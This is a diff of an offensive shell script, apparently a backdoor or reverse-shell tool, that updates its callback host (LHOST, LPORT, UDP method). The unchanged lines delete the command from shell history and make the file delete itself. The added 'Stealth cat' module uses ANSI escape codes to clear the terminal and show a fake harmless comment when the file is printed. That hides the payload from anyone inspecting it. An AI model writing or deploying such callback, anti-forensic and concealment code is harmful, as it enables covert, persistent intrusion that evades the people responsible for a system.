@@ -5,9 +5,9 @@
 # \     \___|   Y  (  <_> )  \__(  <_> )  |__/ __ \|  | |  |   |  \  ___/
 #  \______  /___|  /\____/ \___  >____/|____(____  /__| |__|___|  /\___  >
 #         \/     \/            \/                \/             \/     \/
-# v0.2 BETA                                         Last update 23/07/2017
+# v0.2 BETA                                         Last update 06/12/2017
 
-LHOST="192.168.1.19"
+LHOST="192.168.1.22"
 LPORT="4242"
 LMTHD="--udp"
 TMPDIR="/var/lock"
@@ -103,3 +103,8 @@ history -d $(history | tail -2 | awk '{print $1}') 2> /dev/null
 # Module      : Auto remove
 # Description : Selfdestructing file
 rm $0 2> /dev/null
+
+
+# Module      : Stealth cat
+# Description : Hide the payload with ANSI chars
+#[2J[2J[2J[2H[2A# Do not remove. Generated from /etc/issue.conf by configure.
